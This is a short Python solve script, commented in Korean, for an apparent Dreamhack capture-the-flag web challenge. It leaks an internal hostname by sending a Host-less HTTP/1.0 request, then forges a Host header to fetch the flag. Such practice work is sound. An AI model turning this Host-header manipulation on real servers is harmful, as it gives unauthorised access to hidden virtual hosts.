import socket
import json

# 1. 도메인 알아내기
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("host3.dreamhack.games", 9125)) # 포트 번호 확인!

# Host 헤더 없이 HTTP/1.0 요청 전송
request = b"GET /h HTTP/1.0\r\n\r\n"
sock.send(request)

response = sock.recv(4096).decode('utf-8')
print("[+] Raw Response:\n", response)

# 응답에서 JSON 부분만 찾아서 도메인 파싱 (수동으로 확인해도 됨)
try:
    headers_json = response.split('\r\n\r\n')[1]
    headers_obj = json.loads(headers_json)
    leaked_host = headers_obj['host'] # 예: ivy.secret.com
    print(f"\n[+] Leaked Host: {leaked_host}")
    
    # 진짜 도메인 추출 (ivy. 제거)
    real_domain = leaked_host.replace('ivy.', '')
    target_host = f"yvi.{real_domain}"
    print(f"[+] Target Host: {target_host}")

    # 2. Flag 획득하기 (Host 헤더 포함해서 /f 요청)
    import requests
    url = "http://host3.dreamhack.games:9125/f"
    res = requests.get(url, headers={"Host": target_host})
    print(f"\n[+] FLAG: {res.text}")

except Exception as e:
    print("Parsing Error (See Raw Response):", e)